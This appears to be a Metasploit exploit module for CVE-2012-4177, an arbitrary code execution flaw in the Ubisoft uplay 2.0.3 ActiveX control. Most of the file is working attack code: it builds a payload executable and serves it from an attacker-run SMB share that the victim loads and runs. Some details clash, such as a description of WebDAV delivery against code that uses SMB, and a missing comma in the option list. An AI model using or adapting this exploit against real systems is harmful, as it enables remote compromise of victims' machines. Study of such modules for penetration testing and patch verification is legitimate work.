##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::SMBFileServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ubisoft uplay 2.0.3 ActiveX Control Arbitrary Code Execution',
      'Description'    => %q{
        The uplay ActiveX component allows an attacker to execute any command line action.
        User must sign in, unless auto-sign in is enabled and uplay must not already be
        running.  Due to the way the malicious executable is served (WebDAV), the module
        must be run on port 80, so please make sure you have enough privilege to do that.
        Ubisoft released patch 2.04 as of Mon 20th July.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Tavis Ormandy <taviso[at]cmpxchg8b.com>', # Initial discovery
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
          'phillips321 <phillips321[at]phillips321.co.uk>',
          'Richard Hicks <scriptmonkeyblog[at]gmail.com>'
        ],
      'References'     =>
        [
          [ 'CVE', '2012-4177' ],
          [ 'OSVDB', '84402'],
          [ 'URL', 'http://seclists.org/fulldisclosure/2012/Jul/375'],
          [ 'URL', 'http://forums.ubi.com/showthread.php/699940-Uplay-PC-Patch-2-0-4-Security-fix' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 29 2012'))

    register_options(
    [
      OptPath.new('ORIGINAL_FILE', [true, "The original file", nil]),
    ], self.class)

    # WebDAV does not support SSL and must run over port 80.
    deregister_options('SSL', 'SSLVersion', 'SSLCert', 'SRVPORT' 'URIPATH')
  end

  def start_server
    exe = generate_payload_exe
    original_file = ::File.read(datastore['ORIGINAL_FILE'])
    @exe_file = ::File.basename(datastore['ORIGINAL_FILE'])
    @share = rand_text_alpha(5)

    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    @unc = "\\\\#{my_host}\\#{@share}\\#{@exe_file}"
    @count = 0
    r = start_smb_server(@unc, exe, @exe_file)
    print_status("Ready to deliver your payload on #{@unc}")
  end

  def on_client_data(client)
   dprint("New data from #{client.peerhost}:#{client.peerport}")
   smb_recv(client)
   true
 end

  def exploit
    start_server
  end
end

